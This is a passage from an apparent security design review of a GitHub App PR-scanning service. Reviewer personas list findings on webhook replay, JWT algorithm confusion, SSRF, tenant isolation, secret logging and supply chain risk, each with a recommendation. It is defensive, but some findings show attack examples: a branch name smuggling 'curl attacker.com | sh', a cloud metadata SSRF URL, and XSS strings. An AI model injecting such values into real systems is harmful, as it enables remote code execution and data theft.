**Recommendation:** Define and document concrete resource limits: max file size (e.g., 1 MB), max total repository size to index (e.g., 100 MB of code), max parse time per file (e.g., 10s), max total scan time (e.g., 5 minutes), max in-memory graph size (e.g., 100k nodes). Implement these limits in the scan worker and fail gracefully with a clear error when exceeded. Use container-level enforcement (cgroup memory/CPU limits, ulimits) as a backstop. Add unit/integration tests with known-bad inputs (large generated files, deep nesting) to verify limits are enforced and the worker does not crash. Include these limits in user-facing documentation so repository owners understand what will be scanned.

**References:** CWE-400: Uncontrolled Resource Consumption, CWE-770: Allocation of Resources Without Limits or Throttling, OWASP ASVS 11.1.4: Resource Management, MITRE ATT&CK T1499: Endpoint Denial of Service

#### [HIGH] Git fetch mechanism may allow SSRF or arbitrary command injection

The design states the worker will fetch repos via dulwich or 'a constrained git invocation' but does not specify how the clone URL is constructed, validated, or constrained. If the worker accepts a user-influenced URL (e.g., from a webhook payload field that could be spoofed or manipulated), an attacker could point the fetch at an internal service (SSRF) or craft a malicious git URL that exploits vulnerabilities in git or dulwich. The mitigation 'only fetch repos the installation grants' is a policy statement, not a technical control.

**Likelihood:** Medium. GitHub's webhook payload includes repository.clone_url which should be safe, but if the worker logic is buggy or if there's any path where a PR author can influence the fetch URL (e.g., via submodule URLs or git config in the repo), this becomes exploitable.

**Recommendation:** Always construct the git clone URL from trusted GitHub API data (repository.clone_url from the verified webhook payload), never from user-controlled input. If using git as a subprocess, use an allowlist of arguments and avoid shell interpolation—prefer subprocess.run with a list of args. If using dulwich, ensure it cannot be tricked into fetching from file:// or other non-http(s) schemes. Enforce at the network layer: configure the worker container's egress to only allow connections to github.com and deny RFC1918/link-local CIDRs. Add integration tests that attempt to fetch from internal IPs or file:// URLs and confirm they are blocked. Document that submodule URLs are not fetched or are subject to the same controls.

**References:** CWE-918: Server-Side Request Forgery (SSRF), CWE-88: Improper Neutralization of Argument Delimiters in a Command, OWASP ASVS 5.2.6: SSRF Prevention, MITRE ATT&CK T1071.001: Application Layer Protocol: Web Protocols

#### [MEDIUM] Webhook replay protection relies on X-GitHub-Delivery deduplication without TTL

The design states the webhook receiver will 'dedupe on X-GitHub-Delivery' to prevent replay attacks, but does not specify how delivery IDs are stored or for how long. If delivery IDs are kept indefinitely, the deduplication store grows without bound; if they expire too quickly, an attacker who captures a legitimate webhook can replay it after the ID expires. Additionally, there is no mention of timestamp validation (checking that the webhook event is recent).

**Likelihood:** Medium. Webhook replay is a known attack vector, but GitHub's HMAC signature alone provides strong integrity. Replay is most dangerous if an attacker can trigger scans at will to exhaust resources or if replaying an old 'PR merged' event could poison a baseline.

**Recommendation:** Store delivery IDs in a time-bounded cache (e.g., Redis with a 1-hour TTL) or in the database with a created_at timestamp and a cleanup job that purges entries older than 1 hour. Additionally, validate the webhook event timestamp (e.g., GitHub's X-Hub-Signature-256 covers the payload, but you should also check that the event's created_at or similar timestamp is within a reasonable window, say 5 minutes, to reject very old replayed events). Reject events that are too old or whose delivery ID is already seen. Document this in the security model and add integration tests that attempt replay.

**References:** CWE-294: Authentication Bypass by Capture-replay, OWASP ASVS 9.2.1: Verify that the application defends against replay attacks, NIST SP 800-63B 5.2.8: Replay Resistance

#### [MEDIUM] GitHub App private key rotation procedure is not defined

The design lists 'GitHub App private key & webhook secret exposure' as a high-impact risk and proposes 'key rotation runbook' as a mitigation, but does not provide the runbook or describe how rotation is performed without downtime. If the private key is compromised, every installation is at risk, and without a tested rotation procedure, response time will be slow and error-prone.

**Likelihood:** Low to medium likelihood of key compromise (depends on secret management hygiene), but high impact if it occurs. The absence of a runbook increases the blast radius because incident responders will be improvising.

**Recommendation:** Document a key rotation procedure: (1) generate a new private key in the GitHub App settings, (2) deploy the new key to the Sentinel service without downtime (support loading multiple keys, prioritize the newest), (3) wait for the propagation period (all workers have the new key), (4) revoke the old key in GitHub, (5) remove the old key from the secret store. Implement support for multiple private keys in the worker so rotation is zero-downtime. Test the runbook in staging. Set a calendar reminder to rotate keys every 90 days as a best practice. Add monitoring/alerting for authentication failures that could indicate key mismatch or compromise.

**References:** CWE-320: Key Management Errors, NIST SP 800-57 Part 1: Key Management, OWASP ASVS 6.4.1: Secret Management, MITRE ATT&CK T1552.004: Unsecured Credentials: Private Keys

#### [MEDIUM] Multi-tenant authorization enforcement relies on query scoping without architectural safeguards

The design acknowledges multi-tenant data leakage as a risk and proposes 'every query scoped by installation_id / repo_id; row-level authorization checks' as the mitigation. However, there is no description of how this scoping is enforced architecturally (e.g., middleware, parameterized query builder, ORM interceptor). If scoping is left to individual query authors, it is error-prone: a single missing .filter(repo_id=...) clause can leak data across tenants.

**Likelihood:** Medium. Human error in a multi-tenant application is common, especially as the codebase grows and new contributors join. Sentinel is a new service with no existing code review patterns for multi-tenancy.

**Recommendation:** Implement architectural enforcement of tenant isolation. Options: (1) a SQLAlchemy event listener or custom base query that automatically applies repo_id/installation_id filters based on the authenticated context, (2) a database-level row-level security policy (PostgreSQL RLS), or (3) a middleware layer that injects the tenant scope into every request context and validates that all database queries reference it. Add integration tests that attempt cross-tenant queries (e.g., authenticated as installation A, request a scan_run from installation B) and confirm they are blocked. Conduct a security-focused code review of every query when the API is implemented to verify scoping is present. Document the isolation model and enforcement mechanism in the developer guide.

**References:** CWE-639: Authorization Bypass Through User-Controlled Key, OWASP ASVS 4.1.2: Verify that the application enforces access control rules on the server side, OWASP Multitenancy Cheat Sheet, CWE-566: Authorization Bypass Through User-Controlled SQL Primary Key

#### [MEDIUM] Suppression and policy changes lack CODEOWNERS or approval workflow

The Suppression table allows any user (via API or CLI) to suppress a finding with a reason, and RepoPolicy can be changed to set risk_threshold to 0 (effectively disabling the gate). The design mentions 'suppressions require review via CODEOWNERS on a checked-in policy file' in the risks section, but the data model and API design do not reflect this. If suppressions and policy changes can be made without approval, a developer could silence a legitimate finding or neuter the gate before merging a dangerous PR.

**Likelihood:** Medium. This is an insider threat or compromised account scenario. The likelihood depends on repository and API access controls, which are not fully specified.

**Recommendation:** Implement an approval workflow for suppressions and policy changes. Option 1: check-in suppressions and policy as a YAML file in the repository (e.g., .entrygraph/policy.yaml) and require that changes to this file go through the repository's branch protection and CODEOWNERS review before merging. The Sentinel service reads this file from the default branch. Option 2: if suppressions/policy are managed via API, require that changes are proposed and approved by a second authorized user (e.g., a security team member). Document the approval workflow and ensure that suppressions have a required reason and optional expiry. Add alerting for suppression of high/critical findings. Consider making suppressions apply only to specific PRs or branches, not globally.

**References:** CWE-862: Missing Authorization, OWASP ASVS 4.1.5: Verify that access controls fail securely, NIST SP 800-53 AC-3: Access Enforcement, MITRE ATT&CK T1562.001: Impair Defenses: Disable or Modify Tools

#### [MEDIUM] Secrets may be logged in error messages or scan output

The design does not address the risk of secrets (GitHub App private key, installation tokens, webhook secret, or customer secrets in code being analyzed) appearing in logs, error messages, or the findings/path_json stored in the database. If a scan encounters a hardcoded credential in the analyzed code and includes it in the path_json, that secret is persisted in the findings table and may be visible in the API or GitHub Check Run output.

**Likelihood:** Medium. Error logs commonly leak sensitive context. The indexed code may contain secrets (though entrygraph does not execute code, it does parse literals and strings).

**Recommendation:** Implement secret redaction: (1) configure logging to scrub known secret patterns (e.g., the webhook secret, installation tokens) before writing to stdout/files; (2) in the path_json serializer, redact or truncate string literals that match common secret patterns (API keys, tokens, passwords) to avoid storing customer secrets; (3) in error handling, avoid logging full tracebacks or payloads that may contain sensitive data—log only safe context (event type, repo ID, error class). Document that the findings database contains code structure but should not contain raw secrets. Add unit tests that confirm secrets are not present in logs or finding output.

**References:** CWE-532: Insertion of Sensitive Information into Log File, OWASP ASVS 7.1.2: Log Content Requirements, CWE-209: Generation of Error Message Containing Sensitive Information, MITRE ATT&CK T1552.001: Unsecured Credentials: Credentials In Files

#### [LOW] No rate limiting or abuse prevention for webhook or API endpoints

The design does not mention rate limiting for webhook events or API requests. An attacker could flood the webhook endpoint (even with invalid signatures, consuming CPU to verify HMAC) or spam the REST API (if unauthenticated or with a compromised token) to cause denial of service or exhaust the job queue.

**Likelihood:** Medium likelihood of attempt, but lower severity impact compared to other findings since the primary risk is service degradation rather than data breach. The worker's resource limits provide some backstop.

**Recommendation:** Implement rate limiting at the webhook receiver (e.g., 100 requests/minute per source IP or per installation_id) and at the REST API (e.g., 1000 requests/hour per API key/token). Use a token bucket or leaky bucket algorithm and return 429 Too Many Requests when limits are exceeded. For webhooks, consider that GitHub may retry failed deliveries, so the limit should not be so strict that it blocks legitimate retries. Add monitoring/alerting for rate-limit violations. Document rate limits in the API specification.

**References:** CWE-770: Allocation of Resources Without Limits or Throttling, OWASP ASVS 11.1.4: Resource Management, OWASP API Security Top 10 - API4:2023 Unrestricted Resource Consumption

**Recommendations:**

- Conduct a threat model session with the Sentinel service's architecture before implementation, focusing on the trust boundaries between GitHub (webhook source), the service (worker and API), and the customer's code. Document trust assumptions and validate them with security controls.
- Implement security-focused integration tests for every threat in the risks table: attempt webhook forgery, SSRF, cross-tenant queries, unauthorized API access, parser resource exhaustion, and key compromise scenarios. Make these tests part of CI and require them to pass before release.
- Publish a security policy and responsible disclosure process for Sentinel (especially important if it becomes a hosted service or is adopted by third parties). Include instructions for reporting vulnerabilities and a commitment to timely patching.
- Before the Sentinel MVP milestone, produce a data flow diagram showing where sensitive data (installation tokens, baselines, findings, customer code structure) is stored at rest and in transit, and document the encryption and access controls for each.
- Add a 'security hardening' milestone between MVP and launch that includes: penetration testing, dependency vulnerability scanning in CI, Docker image hardening (non-root user, minimal base image, immutable filesystem), and a security review of the deployment architecture.

**Open Questions:**

- How is the Sentinel REST API authenticated, and what permissions/scopes are required to read findings, create suppressions, or update policy for a given repository?
- What is the maximum repository size, file count, or graph size that will be scanned, and how are these limits enforced?
- If a user uninstalls the GitHub App, what happens to stored baselines, findings, and suppressions—are they immediately deleted, soft-deleted with a TTL, or retained?
- Will the Docker image for Sentinel run as a non-root user, and will the container filesystem be read-only except for explicitly mounted volumes?
- Is there a plan to use GitHub's code scanning API for SARIF uploads, or will SARIF be uploaded as a Check Run artifact? (This affects authentication and permissions.)
- Are there any plans to scan or block submodules in analyzed repositories, and if so, how are submodule URLs validated to prevent SSRF?
- Will the service support single sign-on (SSO) or SAML for API access, especially in a self-hosted deployment at an enterprise customer?
- What is the expected isolation boundary for a self-hosted Sentinel deployment—one instance per organization, or one instance serving multiple organizations with isolation enforced in software?

### Application Security Engineer

This specification introduces significant new attack surface through webhook handling, GitHub App authentication, and analysis of untrusted PR code. While many mitigations are outlined, the design includes several high-risk patterns requiring careful implementation: HMAC signature verification (timing attacks), JWT signing (algorithm confusion), git repository fetching (SSRF/command injection), and multi-tenant data isolation. The core insight that 'entrygraph never executes code' is strong, but the surrounding infrastructure—webhook receivers, git operations, and secret management—demands hardened implementation to prevent privilege escalation and data leakage.

**Confidence:** high

#### [CRITICAL] Command injection risk in git fetch operations

The tech stack mentions 'constrained `git` invocation' as an alternative to dulwich for fetching repositories. If branch names, commit SHAs, or repository URLs from webhook payloads are interpolated into shell commands without proper escaping, an attacker can inject arbitrary commands. For example: `subprocess.run(f'git fetch {user_supplied_branch}', shell=True)` with a branch name like `main; curl attacker.com | sh` achieves RCE on the worker. Even without shell=True, argument injection remains possible (e.g., `--upload-pack` to execute arbitrary scripts).

**Likelihood:** High if subprocess with shell=True is used; medium if shell=False but arguments aren't validated. PRs can have attacker-controlled branch names and SHAs in the webhook payload, making exploitation straightforward.

**Recommendation:** Strongly prefer dulwich (pure Python) to eliminate shell invocation entirely. If subprocess is unavoidable: (1) Never use shell=True. (2) Pass git commands as lists: `['git', 'fetch', url, sha]`. (3) Validate all inputs against strict allowlists (SHA: `^[0-9a-f]{40}$`, branch: `^[a-zA-Z0-9/_-]+$`). (4) Use `--` to terminate option parsing: `['git', 'fetch', '--', url, sha]`. (5) Drop all environment variables except safe ones (GIT_DIR, etc.) to prevent injection via GIT_* env vars.

**References:** CWE-78: OS Command Injection, OWASP Top 10 2021 A03:2021 – Injection, CWE-88: Argument Injection, MITRE ATT&CK T1059: Command and Scripting Interpreter

#### [CRITICAL] JWT algorithm confusion enables authentication bypass

The specification uses PyJWT to generate GitHub App JWTs (mentioned in tech stack and `sentinel/github.py`). If the JWT verification logic does not explicitly specify allowed algorithms, an attacker can craft a JWT with `alg: none` or switch from RS256 (asymmetric) to HS256 (symmetric) using the public key as the HMAC secret. This bypasses signature verification, allowing arbitrary installation token requests and full impersonation of the GitHub App across all installations.

**Likelihood:** Medium—requires access to the public key (often in GitHub App metadata) and knowledge of the verification endpoint. But the impact is total compromise of multi-tenant isolation.

**Recommendation:** Always specify algorithms explicitly when decoding JWTs: `jwt.decode(token, public_key, algorithms=['RS256'])`. Never allow `alg: none`. When generating JWTs for GitHub App authentication, use `jwt.encode(payload, private_key, algorithm='RS256')`. Add integration tests that attempt to verify a JWT with mismatched algorithms and assert they are rejected. Review PyJWT's secure usage guide: https://pyjwt.readthedocs.io/en/stable/usage.html#encoding-decoding-tokens-with-hs256

**References:** CWE-347: Improper Verification of Cryptographic Signature, CVE-2015-9235: JWT algorithm confusion, OWASP ASVS 4.0.3 v2.6.2: Verify cryptographic algorithm is explicit, https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

#### [HIGH] Webhook HMAC verification vulnerable to timing attacks

The specification requires verifying GitHub webhook signatures via X-Hub-Signature-256 HMAC (mentioned in sequence diagram and risks table), but does not mandate constant-time comparison. Python's default string equality (`==`) or `hmac.compare_digest` without proper usage can leak timing information, allowing an attacker to forge valid signatures through side-channel analysis. A successful timing attack enables webhook forgery, triggering unauthorized scans or poisoning baseline data.

**Likelihood:** Medium—timing attacks require network proximity and repeated attempts, but webhook endpoints are Internet-facing and the payoff (arbitrary scan execution) is high. Without explicit constant-time requirements, developers may use naive comparison.

**Recommendation:** Mandate `hmac.compare_digest()` for all HMAC verification in `sentinel/webhook.py`. Document this requirement explicitly and add a unit test that fails if naive comparison is used. Example secure pattern: `hmac.compare_digest(computed_signature, received_signature)` where both inputs are bytes.

**References:** CWE-208: Observable Timing Discrepancy, OWASP ASVS 4.0.3 v2.8.3: Verify that signatures use secure comparison, https://docs.python.org/3/library/hmac.html#hmac.compare_digest

#### [HIGH] SSRF via malicious git repository URLs

The worker fetches git repositories using installation tokens and GitHub clone URLs (mitigations mention 'never a user-supplied URL'). However, webhook payloads include repository metadata that could be attacker-controlled in certain GitHub App installation flows, or during repository transfer attacks. If the clone URL is used without validation, an attacker might redirect the fetch to internal services (e.g., `http://169.254.169.254/latest/meta-data/` for AWS IMDS, `http://localhost:5432` for internal Postgres). Even with GitHub URLs, subdomain takeover or DNS rebinding can achieve SSRF.

**Likelihood:** Low-to-medium—relies on GitHub App misconfiguration or DNS attacks. But cloud metadata exposure is critical.

**Recommendation:** Validate that all repository clone URLs match GitHub's patterns exactly: `^https://github\.com/[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+\.git$` or `^git@github\.com:[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+\.git$`. For enterprise GitHub, allowlist the known domain. Enforce egress filtering at the network layer to deny private IP ranges (RFC 1918, 169.254.0.0/16, ::1, etc.) and the link-local metadata endpoint. Use DNS resolution pinning or deny DNS responses that resolve to private IPs. Never follow HTTP redirects during git operations.

**References:** CWE-918: Server-Side Request Forgery (SSRF), OWASP Top 10 2021 A10:2021 – Server-Side Request Forgery, MITRE ATT&CK T1071.001: Application Layer Protocol, https://github.blog/2021-03-31-removing-support-for-url-protocol-redirection/

#### [HIGH] Broken access control: missing row-level repo_id authorization

The multi-tenant design stores findings/baselines for multiple repositories in shared Postgres tables, scoped by `repo_id` (mentioned in data models and risks table). The spec states 'Every query scoped by installation_id / repo_id' but does not enforce this architecturally. If a query forgets to filter by `repo_id` (e.g., `session.query(Finding).filter(Finding.fingerprint == fp)` without `Finding.repo_id == authorized_repo_id`), an attacker can access or modify another tenant's data by guessing fingerprints or scan IDs. This leaks sensitive code graph data and violates multi-tenant isolation.

**Likelihood:** Medium—requires developer error (missing filter clause), but inevitable in a complex codebase. Impact is cross-tenant data leakage, which is critical in a security product.

**Recommendation:** Implement mandatory row-level security (RLS) at the ORM layer. Option 1: SQLAlchemy query filters via a `scoped_session` or session event that auto-injects `repo_id` filters. Option 2: Postgres RLS policies: `CREATE POLICY tenant_isolation ON findings USING (repo_id = current_setting('app.repo_id')::int);` and set `app.repo_id` per query via `SET LOCAL`. Option 3: Wrap all DB access in a data access layer that requires an authorization context and audits filter presence. Add integration tests that attempt to query a finding/baseline for repo A while authenticated as repo B and assert failure.

**References:** CWE-639: Authorization Bypass Through User-Controlled Key, OWASP Top 10 2021 A01:2021 – Broken Access Control, OWASP ASVS 4.0.3 v4.1.2: Verify authorization checks are enforced at data layer, CWE-284: Improper Access Control

#### [HIGH] Sensitive data exposure: private key and webhook secret in logs/errors

The spec requires GitHub App private key and webhook secret to be sourced from environment/secret manager ('never in the DB or logs'). However, without explicit sanitization, these secrets can leak via exception stack traces (e.g., JWT signing errors that include the key), debug logs (e.g., `logger.debug(f'Request with secret {secret}')`, or structured logging that captures all env vars. An attacker gaining read access to logs (e.g., via SSRF, misconfigured logging endpoint, or compromised monitoring) can extract the private key and fully impersonate the GitHub App.

**Likelihood:** Medium—requires a secondary vulnerability (log access) but is a common anti-pattern in new codebases. Private keys in exceptions are especially common.

**Recommendation:** Implement a secrets filter in the logging configuration that redacts known secret patterns (private key headers, HMAC secrets) before emission. Example: wrap the root logger with a filter that replaces `-----BEGIN RSA PRIVATE KEY-----.*-----END RSA PRIVATE KEY-----` with `[REDACTED]`. Never log exception details that include the signing key; catch JWT errors and log only safe metadata. Audit all `logger` calls to ensure secrets are not interpolated. Use structured logging with explicit allowlists of safe fields. Add a pre-commit hook that fails on `logger.*secret` or `logger.*private_key` strings.

**References:** CWE-532: Insertion of Sensitive Information into Log File, OWASP Top 10 2021 A09:2021 – Security Logging and Monitoring Failures, OWASP ASVS 4.0.3 v7.2.1: Verify sensitive data is not logged, CWE-209: Generation of Error Message Containing Sensitive Information

#### [MEDIUM] Path traversal in fingerprint or file path handling

The fingerprint logic includes symbol qualified names (`symbol.qname`) in the hash, and findings store `path_json` with rendered hops. If these include file paths derived from the analyzed repository (e.g., `src/../../etc/passwd` in a malicious repo), and if later code reconstructs file paths from stored data without sanitization (for example, generating a report or serving SARIF), path traversal can occur. An attacker could craft a repository with malicious qnames/paths that, when rendered, write to arbitrary locations or expose sensitive files.

**Likelihood:** Low—requires that stored paths are later used unsafely for file I/O or rendering. The spec doesn't detail rendering logic, so likelihood depends on implementation.

**Recommendation:** Normalize and validate all file paths before storage. Strip leading `..` and `/` segments: `os.path.normpath(path).lstrip('/')`. When storing `path_json`, serialize only safe metadata (line numbers, qnames) without raw file paths, or validate paths against the repository root using `pathlib.Path.resolve()` and asserting they remain under the workspace. When generating SARIF, ensure artifact locations use relative paths only and validate against the repo root. Never pass stored paths directly to file operations.

**References:** CWE-22: Path Traversal, OWASP Top 10 2021 A01:2021 – Broken Access Control, CWE-73: External Control of File Name or Path

#### [MEDIUM] SQL injection via insufficient ORM usage or raw queries

The spec mandates SQLAlchemy 2.0 ORM with `Mapped` columns, which mitigates SQL injection when using ORM methods. However, the design includes filtering on `fingerprint` (user-derived hash), `repo_id`, and string fields like `reason` in suppressions. If any queries use raw SQL (e.g., `session.execute(text(f'SELECT * FROM findings WHERE fingerprint = {fp}'))` or construct filter strings dynamically from user input), SQL injection is possible. This could leak cross-tenant data, escalate privileges, or corrupt baselines.

**Likelihood:** Low if ORM is used consistently; medium if raw SQL or `text()` is used anywhere with unsanitized input. The spec doesn't mandate raw queries, but complex filtering (like JSONB queries on `gated_categories` or `path_json`) may tempt developers to drop to raw SQL.

**Recommendation:** Prohibit raw SQL and `text()` constructs. All queries must use SQLAlchemy ORM or Core with bound parameters. For JSONB/complex queries, use SQLAlchemy's JSON operators: `RepoPolicy.gated_categories.cast(JSONB)['key']`. Add a linting rule or pre-commit hook that fails on `text()` without bound params. Audit all queries to ensure user-controlled values (fingerprints, repo IDs, filter strings) are passed as parameters, not interpolated: `session.query(Finding).filter(Finding.fingerprint == fingerprint)` not `filter(f'fingerprint = {fingerprint}')`.

**References:** CWE-89: SQL Injection, OWASP Top 10 2021 A03:2021 – Injection, OWASP ASVS 4.0.3 v5.3.4: Verify SQL queries use parameterized queries

#### [MEDIUM] Denial of service via unbounded resource consumption during parsing

The spec acknowledges DoS risk ('A hostile repo could try to exhaust resources during parse') and proposes per-file size caps, time budgets, and max-node limits. However, these mitigations are not specified concretely. Without enforced limits, an attacker can submit a PR with deeply nested syntax (e.g., 10,000-level nested function calls or massive JSON files) that causes tree-sitter to OOM or loop indefinitely, starving the worker and preventing legitimate scans. Even read-only operations can exhaust CPU/memory.

**Likelihood:** High—PRs are untrusted by design, and generating malicious syntax is trivial. The impact is worker unavailability, delaying all scans.

**Recommendation:** Enforce strict resource limits in `sentinel/worker.py` before indexing: (1) Per-file size cap: reject files >1 MB before parsing. (2) Total file count cap: reject repos with >10,000 files. (3) Max parse tree depth: configure tree-sitter with a depth limit (e.g., 256 levels) if supported, or post-parse reject trees exceeding a depth threshold. (4) Timeout: wrap the entire scan in a hard timeout (e.g., 5 minutes) using `signal.alarm()` or asyncio timeouts. (5) Memory cgroup limit in the worker container (e.g., 2 GB). (6) Reject binary files early via mime-type sniffing. Log and alert when these limits are hit to detect attack attempts.

**References:** CWE-400: Uncontrolled Resource Consumption, CWE-409: Improper Handling of Highly Compressed Data (Zip Bomb), OWASP ASVS 4.0.3 v1.5.2: Verify resource limits are enforced

#### [MEDIUM] Race condition in baseline update allows check-time-of-use bypass

The spec states baselines refresh 'on merge to the default branch' and scans diff against 'the baseline for the base branch.' If two PRs merge concurrently or a PR is re-scanned after the baseline updates but before the Check Run completes, the diff comparison can become inconsistent. An attacker might exploit this by timing a PR to race with a baseline update, causing a dangerous path to be classified as 'known' when it's actually new, bypassing the gate. Alternatively, a baseline update mid-scan could cause the gate to pass a PR that should fail.

**Likelihood:** Low—requires precise timing and concurrent merges, but possible in active repos. Impact is gate bypass.

**Recommendation:** Lock the baseline during scan execution. Option 1: Use a database transaction with `SELECT ... FOR UPDATE` on the `Baseline` row, ensuring the scan reads a consistent snapshot. Option 2: Baseline updates must be atomic: create a new baseline row and atomically swap the `repo_id + branch` reference under a lock. Option 3: Scans must snapshot the baseline at start and reject if the baseline changes mid-scan (compare baseline `id` or `commit_sha` at start vs. end). Document the baseline update process clearly and add tests for concurrent PR scans.

**References:** CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition, OWASP ASVS 4.0.3 v1.11.3: Verify critical operations use locking or transactions

#### [MEDIUM] SARIF injection allows code execution in GitHub code scanning UI

The spec requires outputting SARIF 2.1.0 for GitHub code scanning, including finding details like `path_json`, `description`, and symbol qnames. SARIF fields like `message.text` and `location.physicalLocation.artifactLocation.uri` are rendered in GitHub's UI. If user-controlled data (e.g., a malicious qname like `<script>alert(1)</script>` or a file path with Markdown injection) is inserted into SARIF without escaping, it could trigger XSS or Markdown injection in the GitHub UI, affecting developers viewing the scan results. While GitHub likely sanitizes SARIF, defense-in-depth requires safe output generation.

**Likelihood:** Low—GitHub's UI likely sanitizes, but defense-in-depth is prudent. Impact is XSS in a security tool's output, which is high-trust.

**Recommendation:** Escape all user-controlled data before serializing to SARIF. For `message.text` and `message.markdown`, escape HTML entities: `html.escape(text)` and validate Markdown doesn't contain raw HTML. For `artifactLocation.uri`, validate paths are relative and sanitized (no `..` or `javascript:` schemes). Never include raw user input (qnames, file paths from untrusted repos) without validation. Use a SARIF library that handles escaping automatically (e.g., Microsoft's SARIF SDK) or implement strict schema validation. Add unit tests that serialize findings with adversarial qnames (`<script>`, `[link](javascript:alert)`) and assert safe output.

**References:** CWE-79: Cross-site Scripting (XSS), CWE-116: Improper Encoding or Escaping of Output, OWASP Top 10 2021 A03:2021 – Injection, https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html

**Recommendations:**

- Establish a secure development checklist for the Sentinel service that mandates: constant-time HMAC comparison, explicit JWT algorithm validation, input validation on all external data (SHAs, branch names, URLs, fingerprints), and ORM-only database access with mandatory repo_id scoping.
- Implement integration tests that simulate hostile inputs at every boundary: forged webhooks, algorithm-confused JWTs, SSRF-attempt clone URLs, DoS-sized repositories, path-traversal qnames, and cross-tenant query attempts. These tests must fail safely.
- Deploy Sentinel workers in hardened containers with: read-only root filesystem, no network egress except GitHub API, memory/CPU cgroups, non-root user, seccomp profile blocking execve/fork, and mandatory secret sanitization in logs.
- Conduct a pre-launch security review focusing on: webhook authentication flow, git fetch sandboxing, multi-tenant data isolation in all SQL queries, and secrets handling (audit for any logging/serialization of private keys).
- Implement Postgres row-level security (RLS) policies as a mandatory second layer of authorization, even if application-level filtering is in place. This defends against logic errors in query construction.
- Add a secrets scanning tool (e.g., detect-secrets, Gitleaks) to the CI pipeline that fails on committed private keys, webhook secrets, or database credentials. Rotate all secrets on any suspected exposure.

**Open Questions:**

- What is the exact method for git repository fetching in the worker? If subprocess is used instead of dulwich, what are the specific subprocess invocation patterns and argument sanitization measures?
- How are GitHub App private keys provisioned and rotated in production? Is there a key rotation runbook with specific steps and tested failover?
- What is the authentication mechanism for the Sentinel REST API (`sentinel/api.py`)? How does it verify that a caller is authorized to access a specific repo's findings/baselines?
- Are there rate limits on webhook processing and scan execution to prevent a single malicious installation from exhausting resources?
- What is the exact schema of `path_json` in the `Finding` table? Does it include raw file paths, and how are they sanitized before storage and before SARIF output?
- Is there a process for securely deleting findings and graph data on GitHub App uninstallation (hard delete mentioned in risks), and how is this enforced at the database level?
- What is the secret management solution for production Sentinel deployments (e.g., AWS Secrets Manager, HashiCorp Vault, Kubernetes Secrets)? Are secrets rotated automatically?
- How is the worker job queue (arq + Redis) secured? Are jobs authenticated to prevent spoofing, and is Redis access restricted to the worker only?

### Supply Chain Security Engineer

This design introduces significant supply chain expansion through 8+ new runtime dependencies (FastAPI, arq, Redis, PostgreSQL, dulwich, PyJWT, httpx, uvicorn), a self-hostable service with privileged GitHub App credentials, and a GitHub Action that will run in CI pipelines—all while handling untrusted PR code. Critical gaps: no container image signing or provenance, underspecified secrets management (GitHub App private key rotation, storage), dependency vetting strategy limited to pinning, and SBOM treatment as an afterthought. The Docker image and GitHub Action become high-value supply chain targets with no described build integrity controls. The tool's positioning as a security gate amplifies supply chain risk—a compromise here could bypass the very protections it enforces.

**Confidence:** high

#### [CRITICAL] GitHub App private key and webhook secret management underspecified

The GitHub App private key and webhook secret are the crown jewels—compromise grants full impersonation across all installations, allowing an attacker to read all customer code, falsify security gates, or push malicious commits. The design specifies 'env/secret manager only' and 'key rotation runbook' but provides no concrete guidance on HSM usage, key storage encryption, access controls, rotation automation, or secret injection into the Sentinel worker. The runbook is mentioned but not defined. Installation tokens are described as 'short-lived' but without TTL specifics or refresh logic.

**Likelihood:** High if secrets are exposed via misconfigured env vars, weak secret manager policies, or container logs. Private keys are long-lived by nature, increasing exposure window. 'Runbook' without automation means rotation won't happen in practice.

**Recommendation:** Store the GitHub App private key in an HSM or KMS (AWS KMS, Azure Key Vault, HashiCorp Vault) with encryption at rest. Inject at runtime via secrets manager sidecar or init container, never bake into the image. Automate key rotation (90-day max TTL) with zero-downtime failover. Restrict secret access to the worker service principal only. Limit installation token TTL to 1 hour maximum and refresh per-scan. Log all secret access and alert on anomalies. Document threat model and recovery procedures for key compromise.

**References:** CWE-798: Use of Hard-coded Credentials, OWASP ASVS V2: Authentication, NIST SP 800-57: Key Management

#### [HIGH] Sentinel Docker image lacks signing and provenance attestation

Sentinel ships as a Docker image with no mention of image signing (e.g., cosign), content trust, or SLSA provenance attestation. Organizations will pull and run this image in sensitive CI/CD environments with access to GitHub App credentials and customer source code. An attacker who compromises the image registry or build pipeline could distribute a backdoored image that exfiltrates GitHub tokens, source code, or injects malicious findings to permit vulnerable code through the gate.

**Likelihood:** Medium—container registries and build pipelines are common supply chain targets, and the lack of signing makes tampering undetectable. The high value of the credentials and data handled by Sentinel makes this an attractive target.

**Recommendation:** Sign all released Sentinel images with cosign or Docker Content Trust. Generate and publish SLSA provenance (minimum L2, target L3) for the build. Document image verification steps for self-hosters. Consider publishing image SBOMs and vulnerability scan results. Use GitHub Actions with restricted permissions and audit logs for the image build pipeline.

**References:** SLSA Build L2/L3, CWE-494: Download of Code Without Integrity Check, NIST SP 800-204D: Strategies for Integration of Software Supply Chain Security in DevSecOps

#### [HIGH] GitHub Action supply chain security not addressed

The design proposes a composite GitHub Action wrapping `entrygraph gate` that will run in thousands of CI pipelines, but provides no detail on action versioning, pinning by commit SHA, permissions scoping (GITHUB_TOKEN), or distribution integrity. Actions are a known supply chain attack vector—a compromised action could steal repo secrets, modify code before analysis, or falsify gate results. The action will handle both the gate CLI and potentially GitHub App credentials if integrated with Sentinel, multiplying the blast radius.

**Likelihood:** High—GitHub Actions are frequently targeted (see Codecov, UA-Parser-JS incidents). Users typically pin to tags (v1, v1.2) not SHAs, allowing tag re-pointing attacks. Composite actions can call external actions without user visibility.

**Recommendation:** Pin all action dependencies (including the action itself in examples) by full commit SHA, not tags. Minimize GITHUB_TOKEN permissions to contents:read and checks:write only. Publish the action from a dedicated, 2FA-enforced GitHub account with branch protection on the action repo. Document that users should review the action source before use. Consider signing action releases and providing a verification workflow.

**References:** GitHub Actions security hardening guide, MITRE ATT&CK T1195.001: Compromise Software Supply Chain, CWE-829: Inclusion of Functionality from Untrusted Control Sphere

#### [HIGH] Dependency vetting and vulnerability management strategy insufficient

